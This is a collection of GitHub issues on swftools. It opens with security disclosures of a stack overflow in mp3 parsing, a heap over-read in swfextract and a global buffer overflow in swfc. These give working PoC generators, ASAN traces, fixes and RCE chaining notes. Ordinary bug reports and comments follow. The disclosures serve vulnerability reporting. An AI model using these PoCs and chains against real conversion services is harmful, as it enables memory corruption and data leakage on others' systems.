    #3 in c_sound src/swfc.c:3895
    #4 in parseArgumentsForCommand src/swfc.c:4475
    #5 in main src/swfc.c:4598
    #6  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #7 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026)
    #8 in _start (src/swfc+0x404920)

Address is located in stack of thread T0 at offset 2112 in frame
    #0 in mp3_read lib/mp3.c:51

  This frame has 2 object(s):
    [32, 40) 'root' (line 52)
    [64, 2112) 'FrameBuf' (line 65) <== Memory access at offset 2112 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow lib/mp3.c:151 in mp3_read

_Demonstrated vs inferred:_ Demonstrated live (real swfc CLI, deterministic, reproduced from a clean independent rebuild): stack-buffer-overflow WRITE of size 6000 at mp3.c:151, overflowing the 2048-byte FrameBuf. Content+size attacker-controlled. RCE inferred, not weaponized.

## Impact
DEMONSTRATED live: a stack-buffer-overflow WRITE whose SIZE and CONTENT are entirely attacker-controlled (everything after byte 4 of the .mp3 is copied into the 2048-byte stack FrameBuf). This is the classic return-address-overwrite primitive  -  far beyond a NULL-deref DoS. Demonstrated: a 6000-byte overflow + crash (ASAN). Inferred (not weaponized): arbitrary code execution via the controlled stack smash. Pre-auth, no privileges.

## Attack chain
CHAIN-2 ANCHOR (swfc compile-service RCE). The cleanest RCE primitive: a crafted .mp3 referenced by a .sc gives swfc a STACK buffer overflow whose size AND content are fully attacker-controlled (the whole file after byte 4) -> classic return-address overwrite (swftools builds without -fstack-protector). Combine with FIND-001/005 (BSS pointer writes) for additional control. Demonstrated: the controlled stack smash (6000-byte overflow). Inferred: RCE via saved-return-address control.

## Suggested fix
Restore the `break` on `!bitrate || !samprate` at lib/mp3.c:124, and guard `if(framesize < 4) break;` before the `fread(data,1,framesize-4,fi)` at lib/mp3.c:151 (the subtraction must never underflow).

## References
- [CWE-787](https://cwe.mitre.org/data/definitions/787.html): Out-of-bounds Write
- [CWE-191](https://cwe.mitre.org/data/definitions/191.html): Integer Underflow
- mp3.c not referenced by any of the 123 NVD CVEs or 193 issues

## Environment
- swftools @ commit `56a672207ac699e63908557b8888087f33e72fd4` - default build (`./configure && make`), default config.

title: Heap buffer over-read in swfextract -p (handlelossless) — fixed 256-entry palette loop over an attacker-sized colormap
author: h0rk1p
body:
# Heap buffer over-read in swfextract -p (handlelossless)  -  fixed 256-entry palette loop over an attacker-sized colormap

**Severity:** HIGH | **CVSS 3.1:** 7.5 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | **CWE:** CWE-125 | **Affected:** swftools @ `56a672207ac6`

## Summary
When extracting a DefineBitsLossless image as PNG (`swfextract -p <id>`), handlelossless allocates the palette to the attacker-supplied colour count: src/swfextract.c:958 `palette = (RGBA*)malloc(cols*sizeof(RGBA))` where `cols = swf_GetU8(tag)+1` (src/swfextract.c:929), so cols is in [1,256]. It then ALWAYS emits a 256-entry palette into the PNG regardless of cols: src/swfextract.c:998 `for(t=0;t<256;t++){ png_write_byte(fi,palette[t].r); ... }` and the alpha variant at :1008. For any colormapped image with fewer than 256 colours (cols<256) this reads palette[cols..255]  -  up to (256-cols)*sizeof(RGBA) bytes  -  past the allocation.

## Affected
- **Component:** swftools@56a672207ac699e63908557b8888087f33e72fd4  -  src/swfextract.c:999 and :1009 (read), src/swfextract.c:958 (undersized alloc)
- **Repository / commit:** https://github.com/matthiaskramm/swftools @ `56a672207ac699e63908557b8888087f33e72fd4`
- **Attacker / interface:** Unauthenticated  -  anyone who can supply a .swf to a `swfextract -p` (PNG extraction) invocation, e.g. an automated SWF->PNG conversion/extraction service. No auth.

## Root cause
```c
src/swfextract.c:929   if(format == 3) cols = swf_GetU8(tag) + 1;        // attacker, [1,256]
src/swfextract.c:958   palette = (RGBA*)malloc(cols*sizeof(RGBA));        // sized to cols
src/swfextract.c:960   for(t=0;t<cols;t++){ palette[t].r=...; }           // fills only cols
src/swfextract.c:998   for(t=0;t<256;t++){                                // ALWAYS 256
src/swfextract.c:999       png_write_byte(fi,palette[t].r);               // OOB read when cols<256
src/swfextract.c:1008  for(t=0;t<256;t++) png_write_byte(fi,palette[t].a); // OOB read (alpha)
```

## Reachability (untrusted source -> sink)
```
SOURCE DefineBitsLossless tag bytes (attacker .swf) swfextract -p 1 poc.swf v main tag loop, -p selects PNG extraction handlelossless(tag) src/swfextract.c:1342 v cols = swf_GetU8(tag)+1 in [1,256] src/swfextract.c:929 palette = malloc(cols*sizeof(RGBA)) src/swfextract.c:958 (sized to cols) for(t=0;t<cols;t++) fill palette[t] src/swfextract.c:960
SINK for(t=0;t<256;t++) png_write_byte(palette[t].r ...) src/swfextract.c:998-1002 (ALWAYS 256)
```
No guard relates the 256 emit-loop to `cols`. Any colormapped image with fewer than 256 colours over-reads; with `cols=1` it reads 1020 bytes past a 4-byte allocation. The bytes are written into the output PNG PLTE/tRNS chunks. Reached by the documented `swfextract -p` option in the default build.

## To reproduce
1. git clone https://github.com/matthiaskramm/swftools && cd swftools && git checkout 56a672207ac699e63908557b8888087f33e72fd4
2. CFLAGS='-g -O1 -std=gnu89 -fpermissive -fcommon -Wno-error -fsanitize=address' CXXFLAGS='-g -O1 -fpermissive -fcommon -Wno-error -fsanitize=address' LDFLAGS='-fsanitize=address' ./configure && make -j"$(nproc)"
3. python3 -c "import struct,zlib; z=zlib.compress(bytes([0xAA,0xBB,0xCC])+bytes([0])*4,9); body=struct.pack('<HBHHB',1,3,1,1,0)+z; tag=struct.pack('<H',(20<<6)|0x3f)+struct.pack('<I',len(body))+body; hdr=bytes([0x08,0x00])+struct.pack('<HH',0x0100,1); a=hdr+tag+struct.pack('<H',0); open('poc.swf','wb').write(b'FWS'+bytes([6])+struct.pack('<I',8+len(a))+a)"
4. ( ulimit -v unlimited; ASAN_OPTIONS=abort_on_error=0 ./src/swfextract -p 1 poc.swf -o /tmp/pic.png )
5. # => AddressSanitizer: heap-buffer-overflow READ at handlelossless src/swfextract.c:999, 1 byte after 4-byte malloc (src/swfextract.c:958)

## Output
=================================================================
==2711521==ERROR: AddressSanitizer: heap-buffer-overflow on address at pc bp sp
READ of size 1 at thread T0
    #0 in handlelossless src/swfextract.c:999
    #1 in main src/swfextract.c:1342
    #2  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #3 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026)
    #4 in _start (src/swfextract_asan+0x13a7a0)

0x7bd346be0035 is located 1 bytes after 4-byte region [0x7bd346be0030,0x7bd346be0034)
allocated by thread T0 here:
    #0 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
    #1 in handlelossless src/swfextract.c:958
    #2 in main src/swfextract.c:1342
    #3  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #4  (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow src/swfextract.c:999 in handlelossless

_Demonstrated vs inferred:_ Demonstrated live: heap-buffer-overflow READ (ASAN) 1 byte after the 4-byte `palette` allocation, looping up to palette[255]; the over-read heap bytes are emitted into the output PNG. Crash on crossing an unmapped page is inferred. No write/RCE  -  read/info-disclosure only.

## Impact
DEMONSTRATED heap out-of-bounds READ of up to 1020 bytes (cols=1 -> malloc(4), loop reads 1024 bytes). The over-read bytes are written verbatim into the output PNG's PLTE/tRNS chunks, so adjacent heap memory is disclosed to whoever receives the converted image (information disclosure), and the read can crash if it crosses an unmapped page (DoS). Pre-auth; attacker supplies the .swf, victim runs swfextract -p (e.g. an automated SWF->PNG extraction service).

## Attack chain
CHAIN-1 (standalone heap disclosure + leak half). Independently a repeatable pre-auth heap-memory disclosure (Heartbleed-class, ~1KB adjacent heap into the returned PNG) when the pipeline returns the converted image. In a multi-tool pipeline it is the info-leak half feeding the FIND-007/003 writes.

## Suggested fix
Bound the palette loops by cols, not 256: `for(t=0;t<cols;t++)` (and zero-fill the remaining PLTE entries if a full 256-entry PLTE is required by the PNG indexed format). Also validate cols against the decompressed colormap length.

## References
- [CWE-125](https://cwe.mitre.org/data/definitions/125.html): Out-of-bounds Read
- [CWE-200](https://cwe.mitre.org/data/definitions/200.html): Information Exposure
- Distinct from [issue#153](https://github.com/matthiaskramm/swftools/issues/153) (datalen width*height integer overflow at src/swfextract.c:942) and [CVE-2017-11100](https://nvd.nist.gov/vuln/detail/CVE-2017-11100) (swf_FoldSprite NULL deref)

## Environment
- swftools @ commit `56a672207ac699e63908557b8888087f33e72fd4` - default build (`./configure && make`), default config.

title: Global buffer overflow (OOB write) in swfc via unbounded .sprite/.button block nesting (s_sprite/s_button miss the stackpos bound check)
author: h0rk1p
body:
# Global buffer overflow (OOB write) in swfc via unbounded .sprite/.button block nesting (s_sprite/s_button miss the stackpos bound check)

**Severity:** HIGH | **CVSS 3.1:** 8.1 `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | **CWE:** CWE-787 | **Affected:** swftools @ `56a672207ac6`

## Summary
swfc keeps a fixed global block stack `static struct {...} stack[256]` (src/swfc.c:196) with a cursor `static int stackpos` (src/swfc.c:197). Every block-opening directive pushes an entry and increments stackpos. The push performed by `s_swf` (the top `.flash/.swf` block) is correctly guarded: src/swfc.c:604 `if(stackpos==sizeof(stack)/sizeof(stack[0])) syntaxerror("too many levels of recursion");`. The pushes performed by `s_sprite` (src/swfc.c:646) and `s_button` (src/swfc.c:695) have NO such check: they do `memset(&stack[stackpos],0,sizeof(stack[0]))`, write attacker-controlled fields, then `stackpos++` unconditionally. `.sprite`/`.button` directives nest without requiring an intervening `.end` (each dispatches its handler immediately via parseArgumentsForCommand -> c_sprite -> s_sprite). A .sc with >=256 nested `.sprite` directives drives stackpos to 256 and the push writes stack[256], one element past the 34816-byte (256*136) array, then keeps marching for each further sprite.

## Affected
- **Component:** swftools@56a672207ac699e63908557b8888087f33e72fd4  -  src/swfc.c:652 (s_sprite); same root cause src/swfc.c:703 (s_button); array decl src/swfc.c:196 (stack[256]); missing guard vs src/swfc.c:604 (s_swf)
- **Repository / commit:** https://github.com/matthiaskramm/swftools @ `56a672207ac699e63908557b8888087f33e72fd4`
- **Attacker / interface:** Unauthenticated  -  anyone who can supply a .sc script to `swfc` (a build pipeline / web service that compiles user-provided SWF scripts, or a user running swfc on an untrusted .sc). No flags, no auth.

## Root cause
```c
src/swfc.c:196   } stack[256];
src/swfc.c:197   static int stackpos = 0;
--- s_swf HAS the guard ---
src/swfc.c:604   if(stackpos==sizeof(stack)/sizeof(stack[0]))
src/swfc.c:605       syntaxerror("too many levels of recursion");
--- s_sprite MISSES it ---
src/swfc.c:646   void s_sprite(const char*name, SRECT*scalegrid, const char*as3name){
src/swfc.c:652       memset(&stack[stackpos], 0, sizeof(stack[0]));   // OOB write when stackpos==256
src/swfc.c:660       stack[stackpos].name = strdup(name);            // attacker pointer written OOB
src/swfc.c:674       stackpos++;                                     // unbounded
--- s_button MISSES it too ---
src/swfc.c:703       memset(&stack[stackpos], 0, sizeof(stack[0]));
src/swfc.c:712       stackpos++;
```

## Reachability (untrusted source -> sink)
```
SOURCE the .sc file content (attacker-controlled) swfc poc.sc v tokenized, then main dispatch loop readToken(); parseArgumentsForCommand(text) src/swfc.c:4596-4598 v command table maps ".sprite" -> c_sprite (*arguments[nr].func)(&args) == c_sprite src/swfc.c:4475 / table :4262 v c_sprite -> s_sprite(name,...) src/swfc.c:3782
SINK memset(&stack[stackpos],0,sizeof(stack[0])) + src/swfc.c:652 stack[stackpos].name = strdup(name); ... stackpos++ src/swfc.c:660-674 (NO bound check)
```
Guards checked: `s_swf` (the only other pusher) guards with `if(stackpos==sizeof(stack)/sizeof(stack[0])) syntaxerror(...)` at src/swfc.c:604  -  proving the author knew the bound is needed  -  but `s_sprite` (:646) and `s_button` (:695) omit it. `.sprite`/`.button` nest without an intervening `.end` (each dispatches its handler immediately), so stackpos grows by one per directive with no decrement until a matching `.end`. Default build, no flags: the bug is reached by the bare `swfc <file>` invocation.

## To reproduce
1. git clone https://github.com/matthiaskramm/swftools && cd swftools
2. git checkout 56a672207ac699e63908557b8888087f33e72fd4
3. # build with ASAN (modern gcc>=14 needs the gnu89/permissive flags; raise vmem for ASAN):
4. CFLAGS='-g -O1 -std=gnu89 -fpermissive -fcommon -Wno-error -fsanitize=address' CXXFLAGS='-g -O1 -fpermissive -fcommon -Wno-error -fsanitize=address' LDFLAGS='-fsanitize=address' ./configure
5. make -j"$(nproc)"   # (if lib/action/lex.swf{4,5}.c fail on yyunput, regenerate: flex -i -Pswf5 lib/action/swf5compiler.flex >lib/action/lex.swf5.c; flex -i -Pswf4 lib/action/swf4compiler.flex >lib/action/lex.swf4.c)
6. { echo '.flash filename="x.swf" version=6 bbox=200x200'; for i in $(seq 0 299); do echo ".sprite s$i"; done; for i in $(seq 0 299); do echo '.end'; done; } > poc.sc
7. ( ulimit -v unlimited; ASAN_OPTIONS=abort_on_error=0 ./src/swfc poc.sc -o /tmp/o.swf )
8. # => AddressSanitizer: global-buffer-overflow WRITE of size 136 at s_sprite src/swfc.c:652, 0 bytes after global 'stack' (size 34816)

## Output
=================================================================
==2687478==ERROR: AddressSanitizer: global-buffer-overflow on address at pc bp sp
WRITE of size 136 at thread T0
    #0 in memset ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:89
    #1 in s_sprite src/swfc.c:652
    #2 in c_sprite src/swfc.c:3782
    #3 in parseArgumentsForCommand src/swfc.c:4475
    #4 in main src/swfc.c:4598
    #5  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #6 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026)
    #7 in _start (src/swfc+0x404920)

0x56191c2c9e20 is located 32 bytes before global variable 'type' defined in 'swfc.c:122:12' (0x56191c2c9e40) of size 4
0x56191c2c9e20 is located 0 bytes after global variable 'stack' defined in 'swfc.c:196:3' (0x56191c2c1620) of size 34816
SUMMARY: AddressSanitizer: global-buffer-overflow src/swfc.c:652 in s_sprite

_Demonstrated vs inferred:_ Demonstrated live: a deterministic global-buffer-overflow WRITE (ASAN, both an independent rebuild and a re-run) of a 136-byte struct exactly one element past the 34816-byte `stack` array, at the 256th nested `.sprite`. Inferred (not demonstrated): escalation to code execution  -  the overwrite is unbounded and stores attacker-chosen `strdup()` heap pointers into successive BSS globals (`stackpos`, the dictionary globals, `tag`), which swfc later dereferences, so controlled corruption -> RCE is plausible but was not weaponized.

## Impact
DEMONSTRATED: a controlled out-of-bounds WRITE into adjacent process globals. The first OOB element is a 136-byte memset (zeroing the global `stackpos` and following globals), immediately followed by writes of attacker-influenced values: `stack[i].name = strdup(name)` and `stack[i].as3name = strdup(as3name)` store heap pointers derived from attacker-chosen sprite names, plus `.id`, `.tag` (a live TAG*), and frame/depth ints. Each additional nested `.sprite` advances the write cursor by one 136-byte slot, so the overwrite is an UNBOUNDED linear march across BSS, overwriting the dictionary globals (`characters`,`images`,`textures`,`outlines`,`gradients`,`filters`,`instances`,`idmap[65536]`,`tag`) that swfc dereferences later in compilation. INFERRED (not demonstrated): because the attacker controls written pointer values and the target globals contain data pointers/counts that are later used, this is a memory-corruption primitive with plausible escalation to arbitrary code execution; only the OOB write + crash were proven. Pre-auth, no privileges; attacker supplies the .sc to swfc.

## Attack chain
CHAIN-2 (swfc compile-service RCE). A single malicious .sc fed to swfc reaches this global stack[256] OOB write (attacker strdup() pointers marched into the adjacent BSS dict_t globals  -  characters/images/idmap and the live `tag` pointer that swfc dereferences later in compilation), AND the FIND-004 stack smash AND the FIND-005 asm-label write. The attacker corrupts a function-pointer-bearing global (or pivots to FIND-004's return-address overwrite) -> control flow. Demonstrated: the controlled global overwrite. Inferred: RCE.

## Suggested fix
Add the same bound check s_swf has to s_sprite and s_button before the push, e.g. at the top of each: if(stackpos>=(int)(sizeof(stack)/sizeof(stack[0]))) syntaxerror("too many levels of recursion");
Better: factor the push into one helper that always checks. Also consider making `stack` dynamically grown.

## References
- [CWE-787](https://cwe.mitre.org/data/definitions/787.html): Out-of-bounds Write
- [CWE-121](https://cwe.mitre.org/data/definitions/121.html): Stack-based Buffer Overflow (analogous, global array)
- Compare guarded push at src/swfc.c:604 (s_swf) vs unguarded src/swfc.c:652 (s_sprite) / src/swfc.c:703 (s_button)
- Distinct from [CVE-2024-22919](https://nvd.nist.gov/vuln/detail/CVE-2024-22919)/22955/22911 (parseExpression's separate LOCAL stack[256] at src/swfc.c:2538) and [CVE-2017-1000176](https://nvd.nist.gov/vuln/detail/CVE-2017-1000176) (mem_put_ in the tokenizer, [issue#23](https://github.com/matthiaskramm/swftools/issues/23))

## Environment
- swftools @ commit `56a672207ac699e63908557b8888087f33e72fd4` - default build (`./configure && make`), default config.

title: `pdf2swf` multiplicates image instead of referencing it
author: ousia
body:
OS: _Fedora 43_ running `swftools-0.9.2` as packaged for the distribution.

[`raster-image.pdf`](https://github.com/user-attachments/files/25312919/raster-image.pdf) contains a single image referenced ten times.

`pdf2swf raster-image.pdf` outputs [`raster-image.swf.txt`](https://github.com/user-attachments/files/25312924/raster-image.swf.txt)[^ext-txt] which is ten times bigger.

`mutool info -I raster-image.pdf` detects a single image in the PDF document: 

```
Retrieving info from pages 1-10...
Images (1):
	1	(1 0 R):	[ Flate ] 739x691 8bpc DevRGB (13 0 R)
```

But `swfextract raster-image.swf` detects ten images in the SWF animation:

```
Objects in file raster-image.swf:
 [-j] 10 JPEGs: ID(s) 4, 11, 18, 25, 32, 39, 46, 53, 60, 67
```

In some presentations, being able to reuse an image is essential.

Would it be possible that references to the same image in the PDF document are translated as references and not as duplicated images?

As far as I can see (but I may be wrong), references to vector images aren’t converted to duplicated images (or so it seems in [`vector-image.swf.txt`](https://github.com/user-attachments/files/25312987/vector-image.swf.txt)).[^ext-txt]

Many thanks for your help.
 

[^ext-txt]: To enable the upload of SWF files, I add to them the `.txt` extension: removing it makes them fully functional SWF animations.

    I’m going to do this with all SWF sample files shared in this repository.

```
	45	(122 0 R):	[ JPX ] 2904x3892 8bpc DevRGB (117 0 R)
	45	(122 0 R):	[ JPX ] 968x1298 8bpc DevRGB (116 0 R)
```

Converting it to SWF with plain `pdf2swf sample-presentation.pdf`, I get from `swfextract sample-presentation.swf`:

```
 [-j] 70 JPEGs: ID(s) 27, 29, 36, 38, 45, 47, 55, 57, 64, 66, 74, 76, 83, 85, 93, 95, 102, 104, 111, 113, 121, 123, 130, 132, 140, 142, 149, 151, 159, 161, 168, 170, 177, 179, 187, 189, 196, 198, 206, 208, 215, 217, 289, 291, 298, 300, 307, 309, 317, 319, 326, 328, 336, 338, 345, 347, 355, 357, 364, 366, 373, 375, 383, 385, 392, 394, 402, 404, 411, 413
 [-p] 7 PNGs: ID(s) 232, 238, 244, 251, 257, 264, 270
```

Is there any way to get `pdf2swf` converting images only once and keeping as many references as required?

This would both speed up conversion and dramatically reduce resulting SWF file size.

Many thanks for your help.

title: swfrender and gfx2gfx definebitsjpeg not yet supported
author: flanter21
body:
I'm trying to render some old swf files to a pdf for my own use. However, I'm having difficulty with a subset (around 15%) of the pages, which are throwing this error.

`rfxswf: extracting from definebitsjpeg not yet supported`

Normally, I'd think that it just isn't supported by swftools as reported. However, since I could extract it using swfextract, I looked further.  I found this issue is replicated in swfrender but also I found that I can work around this by simply using gfx2gfx to convert from a swf to a swf, which additionally can work around this error.
`fatal exception: [1106] PDF_encoding_set_char: Integer parameter 'slot' has bad value 256`

However, in most of the cases, I get this error and then none of the images appear in the output.
```
Warning: Shape doesn't start with a moveTo
Warning: Shape doesn't start with a moveTo
```
Is there any other known workaround? I've tried looking through the source code but I'm very unfamiliar with it. I also note that the converted swfs of the ones that got this error don't display correctly in ruffle, even though the original does.

title: WIth Ruffle SWFtools cannot be a dead project!
author: ROBERT-MCDOWELL
body:
Ruffle https://github.com/ruffle-rs/ruffle/ is almost at the end of the development and is going to rebirth more than 23 years of huge amount of games, professional applications and more back to the net and it's working much better than its ancestor flash plugin!
SWFtools is by this fact far to be dead or not useful anymore, rather it will restart to be a very good tool for developers and especially designer who prefer to work with actionscript rather than javascript. Stay in touch thanks!
